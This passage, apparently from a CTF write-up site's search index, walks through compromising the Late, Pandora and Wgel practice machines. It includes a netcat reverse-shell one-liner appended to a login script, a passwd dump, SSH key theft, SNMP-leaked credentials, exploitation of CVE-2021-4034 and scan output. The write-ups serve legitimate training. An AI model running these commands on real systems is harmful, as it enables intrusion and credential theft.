landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin saned:x:115:119::/var/lib/saned:/usr/sbin/nologin colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin </p> Looking in the /etc/passwd file I can see there is a user called sc_acc . Remember port 22 was open from the nmap scan. I'll try to read svc_acc's ssh private key... The payload... And voila...the private key.. I give the key necessary permissions chmod +600 rsa and use it to login to ssh and read the user flag.","title":"Exploitation"},{"location":"Writeups/2022-06-08-Late-Writeup/#3-privesc","text":"Enter linpeas I'm going to start a python server on my local machine to transfer linpeas to the compromised machine and try to look for ways to escalate priviledges.. Then use curl to get the file Looking at the output of linpeas and using this guide.. I find this interesting file.. Rading the contents of the file, the script runs every time a user logins or exits in. I'll append a reverse shell to the script to see if I'll get something echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.47 1234 >/tmp/f\" >> ssh-alert.sh Along the way I got some minor issues and reset the machine to get it as good as new. I start a netcat listener on my local machine and when I exit from my ssh session, I get a reverse shell..as ROOT !!","title":"3 Privesc"},{"location":"Writeups/2022-06-08-Pandora-Writeup/","text":"From the decription of the machine, I pwned the box in an unintended way. 1 Enumeration nmap \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/Htb/pandora] \u2514\u2500$ sudo nmap --min-rate 20000 10.129.87.252 -oN nmap -v -sU -sS [sudo] password for wolf: Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 07:40 EDT Initiating Ping Scan at 07:40 Scanning 10.129.87.252 [4 ports] Completed Ping Scan at 07:40, 0.20s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 07:40 Completed Parallel DNS resolution of 1 host. at 07:40, 0.06s elapsed Initiating SYN Stealth Scan at 07:40 Scanning 10.129.87.252 [1000 ports] Increasing send delay for 10.129.87.252 from 0 to 5 due to 97 out of 321 dropped probes since last increase. Discovered open port 80/tcp on 10.129.87.252 Discovered open port 22/tcp on 10.129.87.252 Increasing send delay for 10.129.87.252 from 5 to 10 due to 196 out of 653 dropped probes since last increase. Completed SYN Stealth Scan at 07:40, 0.72s elapsed (1000 total ports) Initiating UDP Scan at 07:40 Scanning 10.129.87.252 [1000 ports] Discovered open port 161/udp on 10.129.87.252 Completed UDP Scan at 07:40, 0.39s elapsed (1000 total ports) Nmap scan report for 10.129.87.252 Host is up (0.16s latency). Not shown: 998 closed tcp ports (reset), 6 closed udp ports (port-unreach), 993 open|filtered udp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 161/udp open snmp Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds Raw packets sent: 4138 (186.425KB) | Rcvd: 1009 (40.852KB) I'm going to start with the low lying fruits: SNMP port 161. SNMP Port 161 Simple Network Management Protocol (SNMP) is an internet standard protocol used to monitor and manage Network devices connected over an IP. Snmp can be a great place to look for information. I'm going to head over to metasploit to see if there are any exploits. SNMP can also be enumerated by SNPMWALK . SNMP Enumeration I found this metasploit exploit to enumerate SNMP Running it against the port I get creds for a user:daniel with pass:HotelBabylon23 976 runnable sh /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23' 981 runnable sshd sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 1005 runnable agetty /sbin/agetty -o -p -- \\u --noclear tty1 linux 1041 runnable mysqld /usr/sbin/mysqld 1042 runnable apache2 /usr/sbin/apache2 -k start 1043 runnable apache2 /usr/sbin/apache2 -k start 1044 runnable apache2 /usr/sbin/apache2 -k start 1045 runnable apache2 /usr/sbin/apache2 -k start 1046 runnable apache2 /usr/sbin/apache2 -k start 1047 runnable apache2 /usr/sbin/apache2 -k start 1137 runnable host_check /usr/bin/host_check -u daniel -p HotelBabylon23 1178 runnable apache2 /usr/sbin/apache2 -k start 1199 runnable apache2 /usr/sbin/apache2 -k start 1200 runnable apache2 /usr/sbin/apache2 -k start 1289 unknown kworker/u4:0-events_power_efficient 1302 runnable apache2 /usr/sbin/apache2 -k start 1353 runnable apache2 /usr/sbin/apache2 -k start 1378 unknown kworker/0:0-events 1455 unknown kworker/u4:1-events_power_efficient 1457 unknown kworker/0:1-cgroup_destroy 1459 unknown kworker/1:0 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/snmp/snmp_enum) > 2 Foothold Using the creds I'm able to login into ssh.. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/Htb/pandora] \u2514\u2500$ ssh daniel@10.129.87.252 daniel@10.129.87.252's password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 7 Jun 08:52:40 UTC 2022 System load: 0.02 Usage of /: 63.0% of 4.87GB Memory usage: 8% Swap usage: 0% Processes: 224 Users logged in: 1 IPv4 address for eth0: 10.129.87.252 IPv6 address for eth0: dead:beef::250:56ff:fe96:2577 => /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jun 7 08:51:30 2022 from 10.10.16.14 daniel@pandora:~$ Looking around the daniel's directory I find nothing. Daniel can't execute sudo commands. I then head over to home and find another user Matt. Inside Matt's directory is a user.txt but I can't read it: permission denied. 3 Privesc Time for Linpeas. I start a python server on my local machine and download linpeas on the compromised machine. It seems the sudo version is vulnerable to CVE-2021-4034. Looking around the web I found a python exploit to exploit the vulnerability. Running it on the machine I get root.. @wolf","title":"Pandora HTB Writeup"},{"location":"Writeups/2022-06-08-Pandora-Writeup/#1-enumeration","text":"nmap \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/Htb/pandora] \u2514\u2500$ sudo nmap --min-rate 20000 10.129.87.252 -oN nmap -v -sU -sS [sudo] password for wolf: Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 07:40 EDT Initiating Ping Scan at 07:40 Scanning 10.129.87.252 [4 ports] Completed Ping Scan at 07:40, 0.20s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 07:40 Completed Parallel DNS resolution of 1 host. at 07:40, 0.06s elapsed Initiating SYN Stealth Scan at 07:40 Scanning 10.129.87.252 [1000 ports] Increasing send delay for 10.129.87.252 from 0 to 5 due to 97 out of 321 dropped probes since last increase. Discovered open port 80/tcp on 10.129.87.252 Discovered open port 22/tcp on 10.129.87.252 Increasing send delay for 10.129.87.252 from 5 to 10 due to 196 out of 653 dropped probes since last increase. Completed SYN Stealth Scan at 07:40, 0.72s elapsed (1000 total ports) Initiating UDP Scan at 07:40 Scanning 10.129.87.252 [1000 ports] Discovered open port 161/udp on 10.129.87.252 Completed UDP Scan at 07:40, 0.39s elapsed (1000 total ports) Nmap scan report for 10.129.87.252 Host is up (0.16s latency). Not shown: 998 closed tcp ports (reset), 6 closed udp ports (port-unreach), 993 open|filtered udp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 161/udp open snmp Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds Raw packets sent: 4138 (186.425KB) | Rcvd: 1009 (40.852KB) I'm going to start with the low lying fruits: SNMP port 161.","title":"1 Enumeration"},{"location":"Writeups/2022-06-08-Pandora-Writeup/#snmp-port-161","text":"Simple Network Management Protocol (SNMP) is an internet standard protocol used to monitor and manage Network devices connected over an IP. Snmp can be a great place to look for information. I'm going to head over to metasploit to see if there are any exploits. SNMP can also be enumerated by SNPMWALK .","title":"SNMP Port 161"},{"location":"Writeups/2022-06-08-Pandora-Writeup/#snmp-enumeration","text":"I found this metasploit exploit to enumerate SNMP Running it against the port I get creds for a user:daniel with pass:HotelBabylon23 976 runnable sh /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23' 981 runnable sshd sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 1005 runnable agetty /sbin/agetty -o -p -- \\u --noclear tty1 linux 1041 runnable mysqld /usr/sbin/mysqld 1042 runnable apache2 /usr/sbin/apache2 -k start 1043 runnable apache2 /usr/sbin/apache2 -k start 1044 runnable apache2 /usr/sbin/apache2 -k start 1045 runnable apache2 /usr/sbin/apache2 -k start 1046 runnable apache2 /usr/sbin/apache2 -k start 1047 runnable apache2 /usr/sbin/apache2 -k start 1137 runnable host_check /usr/bin/host_check -u daniel -p HotelBabylon23 1178 runnable apache2 /usr/sbin/apache2 -k start 1199 runnable apache2 /usr/sbin/apache2 -k start 1200 runnable apache2 /usr/sbin/apache2 -k start 1289 unknown kworker/u4:0-events_power_efficient 1302 runnable apache2 /usr/sbin/apache2 -k start 1353 runnable apache2 /usr/sbin/apache2 -k start 1378 unknown kworker/0:0-events 1455 unknown kworker/u4:1-events_power_efficient 1457 unknown kworker/0:1-cgroup_destroy 1459 unknown kworker/1:0 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/snmp/snmp_enum) >","title":"SNMP Enumeration"},{"location":"Writeups/2022-06-08-Pandora-Writeup/#2-foothold","text":"Using the creds I'm able to login into ssh.. \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/Htb/pandora] \u2514\u2500$ ssh daniel@10.129.87.252 daniel@10.129.87.252's password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 7 Jun 08:52:40 UTC 2022 System load: 0.02 Usage of /: 63.0% of 4.87GB Memory usage: 8% Swap usage: 0% Processes: 224 Users logged in: 1 IPv4 address for eth0: 10.129.87.252 IPv6 address for eth0: dead:beef::250:56ff:fe96:2577 => /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Jun 7 08:51:30 2022 from 10.10.16.14 daniel@pandora:~$ Looking around the daniel's directory I find nothing. Daniel can't execute sudo commands. I then head over to home and find another user Matt. Inside Matt's directory is a user.txt but I can't read it: permission denied.","title":"2 Foothold"},{"location":"Writeups/2022-06-08-Pandora-Writeup/#3-privesc","text":"Time for Linpeas. I start a python server on my local machine and download linpeas on the compromised machine. It seems the sudo version is vulnerable to CVE-2021-4034. Looking around the web I found a python exploit to exploit the vulnerability. Running it on the machine I get root.. @wolf","title":"3 Privesc"},{"location":"Writeups/2022-07-23-Wgel-CTF/","text":"THM Easy Box - Wgel CTF 1.Recon Nmap \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ cat tcp_ports # Nmap 7.92 scan initiated Sat Jul 23 19:36:22 2022 as: nmap -p- --min-rate 10000 --max-rate 11000 -Pn -v -oN tcp_ports 10.10.233.55 Increasing send delay for 10.10.233.55 from 0 to 5 due to 182 out of 605 dropped probes since last increase. Increasing send delay for 10.10.233.55 from 5 to 10 due to 76 out of 252 dropped probes since last increase. Increasing send delay for 10.10.233.55 from 80 to 160 due to 14 out of 46 dropped probes since last increase. Warning: 10.10.233.55 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.233.55 Host is up (0.17s latency). Not shown: 35259 filtered tcp ports (no-response), 30274 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Read data files from: /usr/bin/../share/nmap # Nmap done at Sat Jul 23 19:37:52 2022 -- 1 IP address (1 host up) scanned in 90.80 seconds \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ 2.Enumeration Nmap Port 80 and Port 22 Checking the source code of the default page on port 80 for any source code vulns, I find a name which could prove useful later \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ cat 80_22 # Nmap 7.92 scan initiated Sat Jul 23 19:45:27 2022 as: nmap -p 22,80 -Pn -v -oN 80_22 -sC -sV --script vuln 10.10.233.55 Nmap scan report for 10.10.233.55 Host is up (0.28s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | vulners: | cpe:/a:openbsd:openssh:7.2p2: | PACKETSTORM:140070 7.8 https://vulners.com/packetstorm/PACKETSTORM:140070 *EXPLOIT* | EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09 7.8 https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09 *EXPLOIT* | EDB-ID:40888 7.8 https://vulners.com/exploitdb/EDB-ID:40888 *EXPLOIT* | CVE-2016-8858 7.8 https://vulners.com/cve/CVE-2016-8858 | CVE-2016-6515 7.8 https://vulners.com/cve/CVE-2016-6515 | 1337DAY-ID-26494 7.8 https://vulners.com/zdt/1337DAY-ID-26494 *EXPLOIT* | SSV:92579 7.5 https://vulners.com/seebug/SSV:92579 *EXPLOIT* | CVE-2016-10009 7.5 https://vulners.com/cve/CVE-2016-10009 | 1337DAY-ID-26576 7.5 https://vulners.com/zdt/1337DAY-ID-26576 *EXPLOIT* | SSV:92582 7.2 https://vulners.com/seebug/SSV:92582 *EXPLOIT* | CVE-2016-10012 7.2 https://vulners.com/cve/CVE-2016-10012 | CVE-2015-8325 7.2 https://vulners.com/cve/CVE-2015-8325 | SSV:92580 6.9 https://vulners.com/seebug/SSV:92580 *EXPLOIT* | CVE-2016-10010 6.9 https://vulners.com/cve/CVE-2016-10010 | 1337DAY-ID-26577 6.9 https://vulners.com/zdt/1337DAY-ID-26577 *EXPLOIT* | EXPLOITPACK:98FE96309F9524B8C84C508837551A19 5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 *EXPLOIT* | EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT* | EDB-ID:46516 5.8 https://vulners.com/exploitdb/EDB-ID:46516 *EXPLOIT* | EDB-ID:46193 5.8 https://vulners.com/exploitdb/EDB-ID:46193 *EXPLOIT* | CVE-2019-6111 5.8 https://vulners.com/cve/CVE-2019-6111 | 1337DAY-ID-32328 5.8 https://vulners.com/zdt/1337DAY-ID-32328 *EXPLOIT* | 1337DAY-ID-32009 5.8 https://vulners.com/zdt/1337DAY-ID-32009 *EXPLOIT* | SSV:91041 5.5 https://vulners.com/seebug/SSV:91041 *EXPLOIT* | PACKETSTORM:140019 5.5 https://vulners.com/packetstorm/PACKETSTORM:140019 *EXPLOIT* | PACKETSTORM:136234 5.5 https://vulners.com/packetstorm/PACKETSTORM:136234 *EXPLOIT* | EXPLOITPACK:F92411A645D85F05BDBD274FD222226F 5.5 https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F *EXPLOIT* | EXPLOITPACK:9F2E746846C3C623A27A441281EAD138 5.5 https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138 *EXPLOIT* | EXPLOITPACK:1902C998CBF9154396911926B4C3B330 5.5 https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330 *EXPLOIT* | EDB-ID:40858 5.5 https://vulners.com/exploitdb/EDB-ID:40858 *EXPLOIT* | EDB-ID:40119 5.5 https://vulners.com/exploitdb/EDB-ID:40119 *EXPLOIT* | EDB-ID:39569 5.5 https://vulners.com/exploitdb/EDB-ID:39569 *EXPLOIT* | CVE-2016-3115 5.5 https://vulners.com/cve/CVE-2016-3115 | SSH_ENUM 5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT* | PACKETSTORM:150621 5.0 https://vulners.com/packetstorm/PACKETSTORM:150621 *EXPLOIT* | EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 *EXPLOIT* | EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 *EXPLOIT* | EDB-ID:45939 5.0 https://vulners.com/exploitdb/EDB-ID:45939 *EXPLOIT* | EDB-ID:45233 5.0 https://vulners.com/exploitdb/EDB-ID:45233 *EXPLOIT* | CVE-2018-15919 5.0 https://vulners.com/cve/CVE-2018-15919 | CVE-2018-15473 5.0 https://vulners.com/cve/CVE-2018-15473 | CVE-2017-15906 5.0 https://vulners.com/cve/CVE-2017-15906 | CVE-2016-10708 5.0 https://vulners.com/cve/CVE-2016-10708 | 1337DAY-ID-31730 5.0 https://vulners.com/zdt/1337DAY-ID-31730 *EXPLOIT* | CVE-2021-41617 4.4 https://vulners.com/cve/CVE-2021-41617 | EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF 4.3 https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF *EXPLOIT* | EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF 4.3 https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF *EXPLOIT* | EDB-ID:40136 4.3 https://vulners.com/exploitdb/EDB-ID:40136 *EXPLOIT* | EDB-ID:40113 4.3 https://vulners.com/exploitdb/EDB-ID:40113 *EXPLOIT* | CVE-2020-14145 4.3 https://vulners.com/cve/CVE-2020-14145 | CVE-2016-6210 4.3 https://vulners.com/cve/CVE-2016-6210 | 1337DAY-ID-25440 4.3 https://vulners.com/zdt/1337DAY-ID-25440 *EXPLOIT* | 1337DAY-ID-25438 4.3 https://vulners.com/zdt/1337DAY-ID-25438 *EXPLOIT* | CVE-2019-6110 4.0 https://vulners.com/cve/CVE-2019-6110 | CVE-2019-6109 4.0 https://vulners.com/cve/CVE-2019-6109 | CVE-2018-20685 2.6 https://vulners.com/cve/CVE-2018-20685 | SSV:92581 2.1 https://vulners.com/seebug/SSV:92581 *EXPLOIT* | CVE-2016-10011 2.1 https://vulners.com/cve/CVE-2016-10011 | PACKETSTORM:151227 0.0 https://vulners.com/packetstorm/PACKETSTORM:151227 *EXPLOIT* | PACKETSTORM:140261 0.0 https://vulners.com/packetstorm/PACKETSTORM:140261 *EXPLOIT* | PACKETSTORM:138006 0.0 https://vulners.com/packetstorm/PACKETSTORM:138006 *EXPLOIT* | PACKETSTORM:137942 0.0 https://vulners.com/packetstorm/PACKETSTORM:137942 *EXPLOIT* | MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- 0.0 https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT* |_ 1337DAY-ID-30937 0.0 https://vulners.com/zdt/1337DAY-ID-30937 *EXPLOIT* 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-dombased-xss: Couldn't find any DOM based XSS. |_http-csrf: Couldn't find any CSRF vulnerabilities. | vulners: | cpe:/a:apache:http_server:2.4.18: | CVE-2022-31813 7.5 https://vulners.com/cve/CVE-2022-31813 | CVE-2022-23943 7.5 https://vulners.com/cve/CVE-2022-23943 | CVE-2022-22720 7.5 https://vulners.com/cve/CVE-2022-22720 | CVE-2021-44790 7.5 https://vulners.com/cve/CVE-2021-44790 | CVE-2021-39275 7.5 https://vulners.com/cve/CVE-2021-39275 | CVE-2021-26691 7.5 https://vulners.com/cve/CVE-2021-26691 | CVE-2017-7679 7.5 https://vulners.com/cve/CVE-2017-7679 | CVE-2017-3169 7.5 https://vulners.com/cve/CVE-2017-3169 | CVE-2017-3167 7.5 https://vulners.com/cve/CVE-2017-3167 | EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB 7.2 https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB *EXPLOIT* | EDB-ID:46676 7.2 https://vulners.com/exploitdb/EDB-ID:46676 *EXPLOIT* | CVE-2019-0211 7.2 https://vulners.com/cve/CVE-2019-0211 | 1337DAY-ID-32502 7.2 https://vulners.com/zdt/1337DAY-ID-32502 *EXPLOIT* | FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8 6.8 https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8 *EXPLOIT* | CVE-2022-22721 6.8 https://vulners.com/cve/CVE-2022-22721 | CVE-2021-40438 6.8 https://vulners.com/cve/CVE-2021-40438 | CVE-2020-35452 6.8 https://vulners.com/cve/CVE-2020-35452 | CVE-2018-1312 6.8 https://vulners.com/cve/CVE-2018-1312 | CVE-2017-15715 6.8 https://vulners.com/cve/CVE-2017-15715 | 8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2 6.8 https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2 *EXPLOIT* | 4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332 6.8 https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332 *EXPLOIT* | 4373C92A-2755-5538-9C91-0469C995AA9B 6.8 https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B *EXPLOIT* | 0095E929-7573-5E4A-A7FA-F6598A35E8DE 6.8 https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE *EXPLOIT* | CVE-2022-28615 6.4 https://vulners.com/cve/CVE-2022-28615 | CVE-2021-44224 6.4 https://vulners.com/cve/CVE-2021-44224 | CVE-2019-10082 6.4 https://vulners.com/cve/CVE-2019-10082 | CVE-2017-9788 6.4 https://vulners.com/cve/CVE-2017-9788 | CVE-2019-0217 6.0 https://vulners.com/cve/CVE-2019-0217 | CVE-2020-1927 5.8 https://vulners.com/cve/CVE-2020-1927 | CVE-2019-10098 5.8 https://vulners.com/cve/CVE-2019-10098 | 1337DAY-ID-33577 5.8 https://vulners.com/zdt/1337DAY-ID-33577 *EXPLOIT* | CVE-2016-5387 5.1 https://vulners.com/cve/CVE-2016-5387 | SSV:96537 5.0 https://vulners.com/seebug/SSV:96537 *EXPLOIT* | EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D 5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D *EXPLOIT* | EXPLOITPACK:2666FB0676B4B582D689921651A30355 5.0 https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355 *EXPLOIT* | EDB-ID:42745 5.0 https://vulners.com/exploitdb/EDB-ID:42745 *EXPLOIT* | EDB-ID:40909 5.0 https://vulners.com/exploitdb/EDB-ID:40909 *EXPLOIT* | CVE-2022-30556 5.0 https://vulners.com/cve/CVE-2022-30556 | CVE-2022-30522 5.0 https://vulners.com/cve/CVE-2022-30522 | CVE-2022-29404 5.0 https://vulners.com/cve/CVE-2022-29404 | CVE-2022-28614 5.0 https://vulners.com/cve/CVE-2022-28614 | CVE-2022-26377 5.0 https://vulners.com/cve/CVE-2022-26377 | CVE-2022-22719 5.0 https://vulners.com/cve/CVE-2022-22719 | CVE-2021-34798 5.0 https://vulners.com/cve/CVE-2021-34798 | CVE-2021-33193 5.0 https://vulners.com/cve/CVE-2021-33193 | CVE-2021-26690 5.0 https://vulners.com/cve/CVE-2021-26690 | CVE-2020-1934 5.0 https://vulners.com/cve/CVE-2020-1934 | CVE-2019-17567 5.0 https://vulners.com/cve/CVE-2019-17567 | CVE-2019-0220 5.0 https://vulners.com/cve/CVE-2019-0220 | CVE-2019-0196 5.0 https://vulners.com/cve/CVE-2019-0196 | CVE-2018-17199 5.0 https://vulners.com/cve/CVE-2018-17199 | CVE-2018-17189 5.0 https://vulners.com/cve/CVE-2018-17189 | CVE-2018-1333 5.0 https://vulners.com/cve/CVE-2018-1333 | CVE-2018-1303 5.0 https://vulners.com/cve/CVE-2018-1303 | CVE-2017-9798 5.0 https://vulners.com/cve/CVE-2017-9798 | CVE-2017-15710 5.0 https://vulners.com/cve/CVE-2017-15710 | CVE-2016-8743 5.0 https://vulners.com/cve/CVE-2016-8743 | CVE-2016-8740 5.0 https://vulners.com/cve/CVE-2016-8740 | CVE-2016-4979 5.0 https://vulners.com/cve/CVE-2016-4979 | 1337DAY-ID-28573 5.0 https://vulners.com/zdt/1337DAY-ID-28573 *EXPLOIT* | CVE-2019-0197 4.9 https://vulners.com/cve/CVE-2019-0197 | CVE-2020-11985 4.3 https://vulners.com/cve/CVE-2020-11985 | CVE-2019-10092 4.3 https://vulners.com/cve/CVE-2019-10092 | CVE-2018-1302 4.3 https://vulners.com/cve/CVE-2018-1302 | CVE-2018-1301 4.3 https://vulners.com/cve/CVE-2018-1301 | CVE-2018-11763 4.3 https://vulners.com/cve/CVE-2018-11763 | CVE-2016-4975 4.3 https://vulners.com/cve/CVE-2016-4975 | CVE-2016-1546 4.3 https://vulners.com/cve/CVE-2016-1546 | 4013EC74-B3C1-5D95-938A-54197A58586D 4.3 https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D *EXPLOIT* | 1337DAY-ID-33575 4.3 https://vulners.com/zdt/1337DAY-ID-33575 *EXPLOIT* | CVE-2018-1283 3.5 https://vulners.com/cve/CVE-2018-1283 | CVE-2016-8612 3.3 https://vulners.com/cve/CVE-2016-8612 |_ PACKETSTORM:152441 0.0 https://vulners.com/packetstorm/PACKETSTORM:152441 *EXPLOIT* Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 23 19:50:59 2022 -- 1 IP address (1 host up) scanned in 331.69 seconds \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ PORT 80 Using ffuf I do a recursive directory bruteforce scan which proves useful...there is a private key hosted on the server that I think will help to login into ssh \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/BOXES/thm/WgelCTF] \u2514\u2500$ ffuf -u http://10.10.233.55/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -recursion /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive <3 ________________________________________________ :: Method : GET :: URL : http://10.10.233.55/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : true :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 11374, Words: 3512, Lines: 379, Duration: 168ms] index.html [Status: 200, Size: 11374, Words: 3512, Lines: 379, Duration: 166ms] sitemap [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 164ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/FUZZ [INFO] Starting queued job on target: http://10.10.233.55/sitemap/FUZZ .ssh [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 174ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/.ssh/FUZZ [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 173ms] css [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 170ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/css/FUZZ fonts [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 165ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/fonts/FUZZ images [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 166ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/images/FUZZ index.html [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 171ms] js [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 165ms] [INFO] Adding a new job to the queue: http://10.10.233.55/sitemap/js/FUZZ [INFO] Starting queued job on 